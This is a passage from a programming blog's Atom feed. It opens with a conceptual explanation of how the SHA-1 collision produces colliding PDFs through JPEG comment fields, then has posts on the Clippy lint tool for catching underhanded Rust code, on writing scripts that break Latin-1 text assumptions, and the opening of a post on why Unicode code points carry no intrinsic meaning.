<li>A: <code>&lt;header data&gt; COMMENT(&lt;nonce for A&gt;) DISPLAY IMAGE 1</code></li>
<li>B: <code>&lt;header data&gt; COMMENT(&lt;nonce for B&gt;) DISPLAY IMAGE 2</code></li>
</ul>


<p>Here, <code>&lt;header data&gt;</code> is whatever is necessary to make the format work, and the &ldquo;nonce&#8221;s are
strings that make <code>A</code> and <code>B</code> have the same hash. Finding these nonces is where
the computational power is required, since you basically have to brute-force a solution.</p>

<p>Now, to both these strings, they append a suffix C: <code>IMAGE 1(&lt;data for image 1&gt;) IMAGE 2(&lt;data for image 2&gt;)</code>.
This creates two complete documents. Both of the documents contain both images, but each one is instructed
to display a different one. Note that since <code>SHA1(A) == SHA1(B)</code>, <code>SHA1(A + C) = SHA1(B + C)</code>, so these
final documents have the same hash.</p>

<p>The contents of <code>C</code> don&rsquo;t affect the collision at all. So, we can insert any two images in <code>C</code>, to create
our own personal pair of colliding PDFs.</p>

<p>The actual technique used is similar to this, and it relies on JPEG comment fields. They have found
a collision between two strings that look like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>pdf header data                       | String A
</span><span class='line'>begin embedded image                  |
</span><span class='line'>    jpg header data                   |
</span><span class='line'>    declare jpg comment of length N   |
</span><span class='line'>    random nonce of length N          | (comment ends here)
</span><span class='line'>                                     ---
</span><span class='line'>    image 1, length L                 | String C
</span><span class='line'>    jpg EOF byte (2 bytes)            |
</span><span class='line'>    image 2                           |
</span><span class='line'>end embedded image                    |
</span><span class='line'>
</span><span class='line'>and
</span><span class='line'>
</span><span class='line'>pdf header data                       | String B
</span><span class='line'>begin embedded image                  |
</span><span class='line'>    jpg header data                   |
</span><span class='line'>    declare jpg comment of length M   |
</span><span class='line'>    random nonce of length M-L-2      |
</span><span class='line'>                                     ---
</span><span class='line'>    image 1, length L                 | String C
</span><span class='line'>    jpg EOF marker (2 bytes)          | (comment ends here)
</span><span class='line'>    image 2                           |
</span><span class='line'>end embedded image                    |
</span></code></pre></td></tr></table></div></figure>


<p>By playing with the nonces, they managed to generate a collision between <code>A</code> and <code>B</code>. In the first
pdf, the embedded image has a comment containing only the nonce. Once the JPEG reader gets past that
comment, it sees the first image, displays it, and then sees the end-of-file marker and decides to
stop. Since the PDF format doesn&rsquo;t try to interpret the image itself, the PDF format won&rsquo;t be
boggled by the fact that there&rsquo;s some extra garbage data after the JPEG EOF marker. It
simply takes all the data between the &ldquo;begin embedded image&rdquo; and &ldquo;end embedded image&rdquo; blocks,
and passes it to the JPEG decoder. The JPEG decoder itself stops after it sees the end of file
marker, and doesn&rsquo;t get to the extra data for the second image.</p>

<p>In the second pdf, the jpg comment is longer, and subsumes the first image (as well as the EOF marker)
Thus, the JPEG decoder directly gets to the second image, which it displays.</p>

<p>Since the actual images are not part of the original collision (A and B), you can substitute any pair
of jpeg images there, with some length restrictions.</p>

<h2>What are the implications?</h2>

<p>This does mean that you should not trust the integrity of a PDF when all you have
to go on is its SHA-1 hash. Use a better hash. <em>Anyone can generate these colliding PDFs
now.</em></p>

<p>Fortunately, since all such PDFs will have the same prefix A or B, you can detect when
such a deception is being carried out.</p>

<p>Don&rsquo;t check colliding PDFs into SVN. <a href="https://bugs.webkit.org/show_bug.cgi?id=168774#c27">Things break</a>.</p>

<p>In some cases it is possible to use the PDF collision in other formats. For example,
<a href="https://mobile.twitter.com/arw/status/834883944898125824">it can be used to create colliding HTML documents</a>. I think it can be used to colide
ZIP files too.</p>

<p>Outside the world of complex file formats, little has changed. It&rsquo;s still a bad idea to use SHA-1.
It&rsquo;s still possible for people to generate entirely new collisions like Google did, though this
needs a lot of resources. It&rsquo;s possible that someone with resources has already generated such a
&ldquo;universal-key collision&rdquo; for some other file format<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> and will use it on you, but this was
equally possible before Google published their attack.</p>

<p>This does not make it easier to collide with arbitrary hashes &ndash; if someone else
has uploaded a document with a hash, and you trust them to not be playing any tricks,
an attacker won&rsquo;t be able to generate a colliding document for this without immense
resources. The attack only works when the attacker has control over the initial document;
e.g. in a bait-and-switch-like attack where the attacker uploads document A, you read and verify it
and broadcast your trust in document A with hash <code>SHA(A)</code>, and then the attacker switches it with
document B.</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Google&rsquo;s specific collision was designed to be a &ldquo;universal key&rdquo;, since A and B are designed to have the image-switching mechanism built into it. Some other collision may not be like this; it could just be a collision of two images (or whatever) with no such switching mechanism. It takes about the same effort to do either of these, however, so if you have a file format that can be exploited to create a switching mechanism, it would always make more sense to build one into any collision you look for.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Mitigating Underhandedness: Clippy!]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2017/01/21/mitigating-underhandedness-clippy/"/>
    <updated>2017-01-21T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2017/01/21/mitigating-underhandedness-clippy</id>
    <content type="html"><![CDATA[<p><em>This may be part of a collaborative blog post series about underhanded Rust code. Or it may not. I invite you to write your own posts about underhanded code to make it so!</em></p>

<p>Last month we opened up <a href="https://underhanded.rs/blog/2016/12/15/underhanded-rust.en-US.html">The Underhanded Rust competition</a>. This contest is about
writing seemingly-innocuous malicious code; code that is deliberately written to do some harm,
but will pass a typical code review.</p>

<p>It is inspired by the <a href="http://www.underhanded-c.org">Underhanded C</a> contest. Most of the underhanded C submissions have to do
with hidden buffer overflows, pointer arithmetic fails, or misuse of C macros; and these problems
largely don&rsquo;t occur in Rust programs. However, the ability to layer abstractions on each other does
open up new avenues to introducing underhandedness by relying on sufficiently confusing abstraction
sandwiches. There are probably other interesting avenues. Overall, I&rsquo;m pretty excited to see what
kind of underhandedness folks come up with!</p>

<p>Of course, underhandedness is not just about fun and games; we should be hardening our code against
this kind of thing. Even if you trust your fellow programmers. Even if <em>you</em> are the sole programmer and you trust yourself.
After all, <a href="https://github.com/Gankro/thesis/blob/master/thesis.pdf">you can&rsquo;t spell Trust without Rust</a>; and Rust is indeed about trust. Specifically,
Rust is about trusting <em>nobody</em>. Not even yourself.</p>

<p><img src="http://manishearth.github.io/blog_staging/images/post/memes/trust-nobody.jpg" width="300"></p>

<p>Rust protects you from your own mistakes when it comes to memory management. But we
should be worried about other kinds of mistakes, too. Many of the techniques used in underhanded
programming involve sleights of hand that could just as well be introduced in the code by accident, causing bugs.
Not memory safety bugs (in Rust), but still, bugs. The existence of these sleights of hand is great for
that very common situation
<a href="https://underhanded.rs/blog/2016/12/15/underhanded-rust.en-US.html#prize">when you are feeling severely under-plushied and must win a competition to replenish your supply</a>
but we really don&rsquo;t want these creeping into real-world code, either by accident or intentionally.</p>

<hr />

<p>Allow me to take a moment out of your busy underhanded-submission-writing schedules to talk to you about
our Lord and Savior <a href="http://github.com/manishearth/rust-clippy/">Clippy</a>.</p>

<p>Clippy is for those of you who have become desensitized to the constant whining of the Rust compiler
and need a higher dosage of whininess to be kept on their toes. Clippy is for those perfectionists
amongst you who want to know every minute thing wrong with their code so that they can fix it.
But really, Clippy is for everyone.</p>

<p>Clippy is simply a large repository of lints. As of the time of writing this post, there are
<a href="https://github.com/manishearth/rust-clippy/#lints">183 lints</a> in it, though not all of them are enabled by default. These use the regular Rust lint
system so you can pick and choose the ones you need via <code>#[allow(lint_name)]</code> and
<code>#[warn(lint_name)]</code>. These lints cover a wide range of functions:</p>

<ul>
<li>Improving readability of the code (though <a href="https://github.com/rust-lang-nursery/rustfmt/">rustfmt</a> is the main tool you should use for this)</li>
<li>Helping make the code more compact by reducing unnecessary things (my absolute favorite is <a href="https://github.com/Manishearth/rust-clippy/wiki#needless_lifetimes">needless_lifetimes</a>)</li>
<li>Helping make the code more idiomatic</li>
<li>Making sure you don&rsquo;t do things that you&rsquo;re not supposed to</li>
<li>Catching mistakes and cases where the code may not work as expected</li>
</ul>


<p>The last two really are the ones which help with underhanded code. Just to give an example,
we have lints like:</p>

<ul>
<li><a href="https://github.com/Manishearth/rust-clippy/wiki#cmp_nan">cmp_nan</a>, which disallows things like <code>x == NaN</code></li>
<li><a href="https://github.com/Manishearth/rust-clippy/wiki#clone_double_ref">clone_double_ref</a>, which disallows calling <code>.clone()</code> on double-references (<code>&amp;&amp;T</code>), since that&rsquo;s a straightforward copy and you probably meant to do something like <code>(*x).clone()</code></li>
<li><a href="https://github.com/Manishearth/rust-clippy/wiki#for_loop_over_option">for_loop_over_option</a>: <code>Option&lt;T&gt;</code> is iterable, and while this is useful when composing iterators, directly iterating over an option is usually an indication of a mistake.</li>
<li><a href="https://github.com/Manishearth/rust-clippy/wiki#match_same_arms">match_same_arms</a>, which checks for identical match arm bodies (strong indication of a typo)</li>
<li><a href="https://github.com/Manishearth/rust-clippy/wiki#suspicious_assignment_formatting">suspicious_assignment_formatting</a>, which checks for possible typos with the <code>+=</code> and <code>-=</code> operators</li>
<li><a href="https://github.com/Manishearth/rust-clippy/wiki#unused_io_amount">unused_io_amount</a>, which ensures that you don&rsquo;t forget that some I/O APIs may not write all bytes in the span of a single call</li>
</ul>


<p>These catch many of the gotchas that might crop up in Rust code. In fact,
I based <a href="https://www.reddit.com/r/rust/comments/3hb0wm/underhanded_rust_contest/cu5yuhr/">my solution of an older, more informal Underhanded Rust contest</a> on one of these.</p>

<h2>Usage</h2>

<p>Clippy is still nightly-only. We hook straight into the compiler&rsquo;s guts to obtain
the information we need, and like most internal compiler APIs, this is completely unstable. This
does mean that you usually need a latest or near-latest nightly for clippy to work, and there will
be times when it won&rsquo;t compile while we&rsquo;re working to update it.</p>

<p>There is a plan to ship clippy as an optional component of rustc releases, which will fix all of
these issues (yay!).</p>

<p>But, for now, you can use clippy via:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>rustup install nightly
</span><span class='line'><span class="c"># +nightly not necessary if nightly is your default toolchain</span>
</span><span class='line'>cargo +nightly install clippy
</span><span class='line'><span class="c"># in your project folder</span>
</span><span class='line'>cargo +nightly clippy
</span></code></pre></td></tr></table></div></figure>


<p>If you&rsquo;re going to be making it part of the development procedures of a crate
you maintain, you can also <a href="https://github.com/manishearth/rust-clippy/#optional-dependency">make it an optional dependency</a>.</p>

<p>If you&rsquo;re on windows, there&rsquo;s currently a rustup/cargo <a href="https://github.com/rust-lang-nursery/rustup.rs/issues/876">bug</a> where you may have to add
the rustc libs path in your <code>PATH</code> for <code>cargo clippy</code> to work.</p>

<p>There&rsquo;s an experimental project called <a href="https://github.com/killercup/rustfix">rustfix</a> which can automatically apply suggestions from
clippy and rustc to your code. This may help in clippy-izing a large codebase, but it may
also eat your code and/or laundry, so beware.</p>

<h2>Contributing</h2>

<p>There&rsquo;s a <em>lot</em> of work that can be done on clippy. A hundred and eighty lints is just
a start, there are <a href="https://github.com/manishearth/rust-clippy/issues">hundreds more lint ideas filed on the issue tracker</a>. We&rsquo;re
willing to mentor anyone who wants to get involved; and have
<a href="https://github.com/manishearth/rust-clippy/issues?q=is%3Aissue+is%3Aopen+label%3AE-easy">specially tagged &ldquo;easy&rdquo; issues</a> for folks new to compiler internals. In general,
contributing to clippy is a great way to gain an understanding of compiler internals
if you want to contribute to the compiler itself.</p>

<p>If you don&rsquo;t want to write code for clippy, you can also run it on random crates,
open pull requests with fixes, and file bugs on clippy for any false positives that appear.</p>

<p>There are more tips about contributing in <a href="https://github.com/Manishearth/rust-clippy/blob/master/CONTRIBUTING.md">our CONTRIBUTING.md</a>.</p>

<hr />

<p>I hope this helps reduce mistakes and underhandedness in your code!</p>

<p>..unless you&rsquo;re writing code for the Underhanded Rust competition. In that case, underhand away!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Breaking Our Latin-1 Assumptions]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2017/01/15/breaking-our-latin-1-assumptions/"/>
    <updated>2017-01-15T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2017/01/15/breaking-our-latin-1-assumptions</id>
    <content type="html"><![CDATA[<p>So in my <a href="http://manishearth.github.io/blog/2017/01/14/stop-ascribing-meaning-to-unicode-code-points">previous post</a> I explored a specific (wrong) assumption that programmers
tend to make about the nature of code points and text.</p>

<p>I was asked multiple times about other assumptions we tend to make. There are a lot. Most
Latin-based scripts are simple, but most programmers spend their time dealing with Latin
text so these complexities never come up.</p>

<p>I thought it would be useful to share my personal list of
<a href="https://twitter.com/ManishEarth/status/810582690906931200">scripts that break our Latin-1 assumptions</a>. This is a list I mentally check against
whenever I am attempting to reason about text. I check if I&rsquo;m making any assumptions that
break in these scripts. <em>Most</em> of these concepts are independent of Unicode; so any program
would have to deal with this regardless of encoding.</p>

<p>I again recommend going through <a href="https://eev.ee/blog/2015/09/12/dark-corners-of-unicode/">eevee&rsquo;s post</a>, since it covers many related issues.
<a href="https://github.com/jagracey/Awesome-Unicode">Awesome-Unicode</a> also has a lot of random tidbits about Unicode.</p>

<p>Anyway, here&rsquo;s the list. Note that a lot of the concepts here exist in scripts other than the
ones listed, these are just the scripts <em>I</em> use for comparing.</p>

<h2>Arabic / Hebrew</h2>

<p>Both Arabic and Hebrew are RTL scripts; they read right-to-left. This may even affect how
a page is laid out, see the <a href="https://he.wikipedia.org/wiki/%D7%A2%D7%9E%D7%95%D7%93_%D7%A8%D7%90%D7%A9%D7%99">Hebrew Wikipedia</a>.</p>

<p>They both have a concept of letters changing how they look depending on where they are in the word.
Hebrew has the &ldquo;sofit&rdquo; letters, which use separate code points. For example, Kaf (כ) should be typed
as ך at the end of a word. Greek has something similar with the sigma.</p>

<p>In Arabic, the letters can have up to four different forms, depending on whether they start a word,
end a word, are inside a word, or are used by themselves. These forms can look very different. They
don&rsquo;t use separate code points for this; however. You can see a list of these forms <a href="https://en.wikipedia.org/wiki/Arabic_alphabet#Table_of_basic_letters">here</a></p>

<p>As I mentioned in the last post, U+FDFD (﷽), a ligature representing the Basamala,
is also a character that breaks a lot of assumptions.</p>

<h2>Indic scripts</h2>

<p>Indic scripts are <em>abugidas</em>, where you have consonants with vowel modifiers. For example, क is
&ldquo;kə&rdquo;, where the upside down &ldquo;e&rdquo; is a schwa, something like an &ldquo;uh&rdquo; vowel sound. You can change the
vowel by adding a diacritic (e.g <code>ा</code>); getting things like का (&ldquo;kaa&rdquo;) को (&ldquo;koh&rdquo;) कू (&ldquo;koo&rdquo;).</p>

<p>You can also mash together consonants to create consonant clusters. The &ldquo;virama&rdquo; is a vowel-killer
symbol that removes the inherent schwa vowel. So, <code>क</code> + <code>्</code> becomes <code>क्</code>. This sound itself is
unpronounceable since क is a stop consonant (vowel-killed consonants can be pronounced for nasal and some other
consonants though), but you can combine it with another consonant, as <code>क्</code> + <code>र</code> (&ldquo;rə&rdquo;), to get <code>क्र</code>
(&ldquo;krə&rdquo;). Consonants can be strung up infinitely, and you can stick one or more vowel diacritics
after that. Usually, you won&rsquo;t see more than two consonants in a cluster, but larger ones are not
uncommon in Sanskrit (or when writing down some onomatopoeia). They may not get rendered as single
glyphs, depending on the font.</p>

<p>One thing that crops up is that there&rsquo;s no unambiguous concept of a letter here. There
is a concept of an &ldquo;akshara&rdquo;, which basically includes the vowel diacritics, and
depending on who you talk to may also include consonant clusters. Often things are
clusters an akshara depending on whether they&rsquo;re drawn with an explicit virama
or form a single glyph.</p>

<p>In general the nature of the virama as a two-way combining character in Unicode is pretty new.</p>

<h2>Hangul</h2>

<p>Korean does its own fun thing when it comes to conjoining characters. Hangul has a concept
of a &ldquo;syllable block&rdquo;, which is basically a letter. It&rsquo;s made up of a leading consonant,
medial vowel, and an optional tail consonant. &#x1100;&#x1161;&#x11A8; is an example of
such a syllable block, and it can be typed as &#x1100; + &#x1161; + &#x11A8;. It can
also be typed as &#xAC01;, which is a &ldquo;precomposed form&rdquo; (and a single code point).</p>

<p>These characters are examples of combining characters with very specific combining rules. Unlike
accents or other diacritics, these combining characters will combine with the surrounding characters
only when the surrounding characters form an L-V-T or L-V syllable block.</p>

<p>As I mentioned in my previous post, apparently syllable blocks with more (adjacent) Ls, Vs, and Ts are
also valid and used in Old Korean, so the grapheme segmentation algorithm in Unicode considers
&ldquo;ᄀᄀᄀ&#x1100;&#x1161;&#x11A8;ᆨᆨ&rdquo; to be a single grapheme (<a href="http://www.unicode.org/reports/tr29/#Hangul_Syllable_Boundary_Determination">it explicitly mentions this</a>).
I&rsquo;m not aware of any fonts which render these as a single syllable block, or if that&rsquo;s even
a valid thing to do.</p>

<h2>Han scripts</h2>

<p>So Chinese (Hanzi), Japanese (Kanji<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>), Korean (Hanja<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>), and Vietnamese (Hán tự, along with Chữ
Nôm <sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>) all share glyphs, collectively called &ldquo;Han characters&rdquo; (or CJK characters<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup>). These
languages at some point in their history borrowed the Chinese writing system, and made their own
changes to it to tailor to their needs.</p>

<p>Now, the Han characters are ideographs. This is not a phonetic script; individual characters
represent words. The word/idea they represent is not always consistent across languages. The
pronounciation is usually different too. Sometimes, the glyph is drawn slightly differently based on
the language used. There are around 80,000 Han ideographs in Unicode right now.</p>

<p>The concept of ideographs itself breaks some of our Latin-1 assumptions. For example, how
do you define Levenshtein edit distance for text using Han ideographs? The straight answer is that
you can&rsquo;t, though if you step back and decide <em>why</em> you need edit distance you might be able
to find a workaround. For example, if you need it to detect typos, the user&rsquo;s input method
may help. If it&rsquo;s based on pinyin or bopomofo, you might be able to reverse-convert to the
phonetic script, apply edit distance in that space, and convert back. Or not. I only maintain
an idle curiosity in these scripts and don&rsquo;t actually use them, so I&rsquo;m not sure how well this would
work.</p>

<p>The concept of halfwidth character is a quirk that breaks some assumptions.</p>

<p>In the space of Unicode in particular, all of these scripts are represented by a single set of
ideographs. This is known as &ldquo;Han unification&rdquo;. This is a pretty controversial issue, but the
end result is that rendering may sometimes be dependent on the language of the text, which
e.g. in HTML you set with a <code>&lt;span lang=whatever&gt;</code>. <a href="https://en.wikipedia.org/wiki/Han_unification#Examples_of_language-dependent_glyphs">The wiki page</a> has some examples of
encoding-dependent characters.</p>

<p>Unicode also has a concept of variation selector, which is a code point that can be used to
select between variations for a code point that has multiple ways of being drawn. These
do get used in Han scripts.</p>

<p>While this doesn&rsquo;t affect rendering, Unicode, as a system for <em>describing</em> text,
also has a concept of interlinear annotation characters. These are used to represent
<a href="https://en.wikipedia.org/wiki/Ruby_character">furigana / ruby</a>. Fonts don&rsquo;t render this, but it&rsquo;s useful if you want to represent
text that uses ruby. Similarly, there are <a href="https://en.wikipedia.org/wiki/Chinese_character_description_languages#Ideographic_Description_Sequences">ideographic description sequences</a> which
can be used to &ldquo;build up&rdquo; glyphs from smaller ones when the glyph can&rsquo;t be encoded in
Unicode. These, too, are not to be rendered, but can be used when you want to describe
the existence of a character like <a href="https://en.wikipedia.org/wiki/Biangbiang_noodles#Chinese_character_for_bi.C3.A1ng">biáng</a>. These are not things a programmer
needs to worry about; I just find them interesting and couldn&rsquo;t resist mentioning them :)</p>

<p>Japanese speakers haven&rsquo;t completely moved to Unicode; there are a lot of things out there
using Shift-JIS, and IIRC there are valid reasons for that (perhaps Han unification?). This
is another thing you may have to consider.</p>

<p>Finally, these scripts are often written <em>vertically</em>, top-down. <a href="https://en.wikipedia.org/wiki/Mongolian_script">Mongolian</a>, while
not being a Han script, is written vertically sideways, which is pretty unique. The
CSS <a href="https://drafts.csswg.org/css-writing-modes/">writing modes</a> spec introduces various concepts related to this, though that&rsquo;s mostly in the
context of the Web.</p>

<h2>Thai / Khmer / Burmese / Lao</h2>

<p>These scripts don&rsquo;t use spaces to split words. Instead, they have rules for what kinds of sequences
of characters start and end a word. This can be determined programmatically, however IIRC the
Unicode spec does not attempt to deal with this. There are libraries you can use here instead.</p>

<h2>Latin scripts themselves!</h2>

<p>Turkish is a latin-based script. But it has a quirk: The uppercase of &ldquo;i&rdquo; is
a dotted &ldquo;İ&rdquo;, and the lowercase of &ldquo;I&rdquo; is &ldquo;ı&rdquo;. If doing case-based operations, try to use
a Unicode-aware library, and try to provide the locale if possible.</p>

<p>Also, not all code points have a single-codepoint uppercase version. The eszett (ß) capitalizes
to &ldquo;SS&rdquo;. There&rsquo;s also the &ldquo;capital&rdquo; eszett ẞ, but its usage seems to vary and I&rsquo;m not exactly
sure how it interacts here.</p>

<p>While Latin-1 uses precomposed characters, Unicode also introduces ways to specify the same
characters via combining diacritics. Treating these the same involves using the normalization
algorithms (NFC/NFD).</p>

<h2>Emoji</h2>

<p>Well, not a script<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup>. But emoji is weird enough that it breaks many of our assumptions. The
scripts above cover most of these, but it&rsquo;s sometimes easier to think of them
in the context of emoji.</p>

<p>The main thing with emoji is that you can use a zero-width-joiner character to glue emoji together.</p>

<p>For example, the family emoji 👩‍👩‍👧‍👦 (may not render for you) is made by using the woman/man/girl/boy
emoji and gluing them together with ZWJs. You can see its decomposition in <a href="https://r12a.github.io/uniview/?charlist=%F0%9F%91%A9%E2%80%8D%F0%9F%91%A9%E2%80%8D%F0%9F%91%A7%E2%80%8D%F0%9F%91%A6">uniview</a>.</p>

<p>There are more sequences like this, which you can see in the <a href="http://unicode.org/Public/emoji/4.0/emoji-zwj-sequences.txt">emoji-zwj-sequences</a> file. For
example, MAN + ZWJ + COOK will give a male cook emoji (font support is sketchy).
Similarly, SWIMMER + ZWJ + FEMALE SIGN is a female swimmer. You have both sequences of
the form &ldquo;gendered person + zwj + thing&rdquo;, and &ldquo;emoji containing human + zwj + gender&rdquo;,
IIRC due to legacy issues<sup id="fnref:6"><a href="#fn:6" rel="footnote">6</a></sup></p>

<p>There are also <a href="http://www.unicode.org/reports/tr51/#Diversity">modifier characters</a> that let you change the skin tone of an emoji that
contains a human (or human body part, like the hand-gesture emojis) in it.</p>

<p>Finally, the flag emoji are pretty special snowflakes. For example, 🇪🇸 is the Spanish
flag. It&rsquo;s made up of <a href="https://r12a.github.io/uniview/?charlist=%F0%9F%87%AA%F0%9F%87%B8">two regional indicator characters for &ldquo;E&rdquo; and &ldquo;S&rdquo;</a>.</p>

<p>Unicode didn&rsquo;t want to deal with adding new flags each time a new country or territory pops up. Nor
did they want to get into the tricky business of determining what a country <em>is</em>, for example
when dealing with disputed territories. So instead, they just defined these regional indicator
symbols. Fonts are supposed to take pairs of RI symbols<sup id="fnref:7"><a href="#fn:7" rel="footnote">7</a></sup> and map the country code to a flag.
This mapping is up to them, so it&rsquo;s totally valid for a font to render a regional indicator
pair &ldquo;E&rdquo; + &ldquo;S&rdquo; as something other than the flag of Spain. On some Chinese systems, for example,
the flag for Taiwan (🇹🇼) may not render.</p>

<hr />

<p>I hightly recommend comparing against this relatively small list of scripts the next time you
are writing code that does heavy manipulation of user-provided strings.</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Supplemented (but not replaced) by the Hiragana and Katakana phonetic scripts. In widespread use.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>Replaced by Hangul in modern usage<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>Replaced by chữ quốc ngữ in modern usage, which is based on the Latin alphabet<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
<li id="fn:4">
<p>&ldquo;CJK&rdquo; (Chinese-Japanese-Korean) is probably more accurate here, though it probably should include &ldquo;V&rdquo; for Vietnamese too. Not all of these ideographs come from Han; the other scripts invented some of their own. See: Kokuji, Gukja, Chữ Nôm.<a href="#fnref:4" rev="footnote">&#8617;</a></p></li>
<li id="fn:5">
<p>Back in <em>my</em> day we painstakingly typed actual real words on numeric phone keypads, while trudging to 🏫 in three feet of ❄️️, and it was uphill both ways, and we weren&rsquo;t even <em>allowed</em> 📱s in 🏫. Get off my lawn!<a href="#fnref:5" rev="footnote">&#8617;</a></p></li>
<li id="fn:6">
<p>We previously had individual code points for professions and stuff and they decided to switch over to using existing object emoji with combiners instead of inventing new profession emoji all the time<a href="#fnref:6" rev="footnote">&#8617;</a></p></li>
<li id="fn:7">
<p>676 countries should be enough for anybody<a href="#fnref:7" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Let's Stop Ascribing Meaning to Code Points]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2017/01/14/stop-ascribing-meaning-to-unicode-code-points/"/>
    <updated>2017-01-14T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2017/01/14/stop-ascribing-meaning-to-unicode-code-points</id>
    <content type="html"><![CDATA[<p><em>Update: This post got a sequel, <a href="http://manishearth.github.io/blog/2017/01/15/breaking-our-latin-1-assumptions/">Breaking our latin-1 assumptions</a>.</em></p>

<p>I&rsquo;ve seen misconceptions about Unicode crop up regularly in posts discussing it. One very common
misconception I&rsquo;ve seen is that <em>code points have cross-language intrinsic meaning</em>.</p>

<p>It usually comes up when people are comparing UTF8 and UTF32. Folks start implying that code points
<em>mean</em> something, and that O(1) indexing or slicing at code point boundaries is a useful operation.
I&rsquo;ve also seen this assumption manifest itself in actual programs which make incorrect assumptions
about the nature of code points and mess things up when fed non-Latin text.</p>

<p>If you like reading about unicode, you might also want to go through <a href="https://eev.ee/blog/2015/09/12/dark-corners-of-unicode/">Eevee&rsquo;s article</a>
on the dark corners of unicode. Great read!</p>

<h2>Encodings</h2>

<p>So, anyway, we have some popular encodings for Unicode. UTF8 encodes 7-bit code points as a single
byte, 11-bit code points as two bytes, 16-bit code points as 3 bytes, and 21-bit code points as four
bytes. UTF-16 encodes the first three in two bytes, and the last one as four bytes (logically, a
pair of two-byte code units). UTF-32 encodes all code points as 4-byte code units. UTF-16 is mostly
a &ldquo;worst of both worlds&rdquo; compromise at this point, and the main programming language I can think of
that uses it (and exposes it in this form) is Javascript, and that too in a broken way.</p>

<p>The nice thing about UTF8 is that it saves space. Of course, that is subjective and dependent on
the script you use most commonly, for example my first name is 12 bytes in UTF-8 but only 4
in ISCII (or a hypothetical unicode-based encoding that swapped the Devanagri Unicode block with
the ASCII block). It also uses more space over the very non-hypothetical UTF-16 encoding if you
tend to use code points in the U+0800 - U+FFFF range. It always uses less space than UTF-32 however.</p>

<p>A commonly touted disadvantage of UTF-8 is that string indexing is <code>O(n)</code>. Because code points take
up a variable number of bytes, you won&rsquo;t know where the 5th codepoint is until you scan the string
and look for it. UTF-32 doesn&rsquo;t have this problem; it&rsquo;s always <code>4 * index</code> bytes away.</p>

<p>The problem here is that indexing by code point shouldn&rsquo;t be an operation you ever need!</p>

<h2>Indexing by code point</h2>

<p>The main time you want to be able to index by code point is if you&rsquo;re implementing algorithms
defined in the unicode spec that operate on unicode strings (casefolding, segmentation, NFD/NFC).
Most if not all of these algorithms operate on whole strings, so implementing them
as an iteration pass is usually necessary anyway, so you don&rsquo;t lose anything if you can&rsquo;t
do arbitrary code point indexing.</p>

<p>But for application logic, dealing with code points doesn&rsquo;t really make sense. This is because
code points have no intrinsic meaning. They are not &ldquo;characters&rdquo;. I&rsquo;m using scare quotes here
because a &ldquo;character&rdquo; isn&rsquo;t a well-defined concept either, but we&rsquo;ll get to that later.</p>

<p>For example, &ldquo;e&#x0301;&rdquo; is two code points (<code>e</code> +<code>́</code>), where one of them is a combining accent. My name,
&ldquo;मनीष&rdquo;, visually looks like three &ldquo;characters&rdquo;, but is four code points. The &ldquo;नी&rdquo; is made up of <code>न</code>
+ <code>ी</code>. My last name contains a &ldquo;character&rdquo; made up of three code points (and multiple two-code-point
&ldquo;characters&rdquo;). The flag emoji &ldquo;🇺🇸&rdquo; is also made of two code points, <code>🇺</code> + <code>🇸</code>.</p>

<p>One false assumption that&rsquo;s often made is that code points are a single column wide. They&rsquo;re not.
They sometimes bunch up to form characters that fit in single &ldquo;columns&rdquo;. This is often dependent on
the font, and if your application relies on this, you should be querying the font. There are even
code points like U+FDFD (﷽) which are often rendered multiple columns wide. In fact, in my
<em>monospace</em> font in my text editor, that character is rendered <em>almost</em> 12 columns wide. Yes,
&ldquo;almost&rdquo;, subsequent characters get offset a tiny bit. I don&rsquo;t know why.</p>

<p>Another false assumption is that editing actions (selection, backspace, cut, paste) operate on code
points. In both Chrome and Firefox, selection will often include multiple code points. All the
multi-code-point examples I gave above fall into this category. An interesting testcase for this is
the string &ldquo;ᄀᄀᄀ각ᆨᆨ&rdquo;, which will rarely if ever render as a single &ldquo;character&rdquo; but will be considered
as one for the purposes of selection, pretty much universally. I&rsquo;ll get to why this is later.</p>

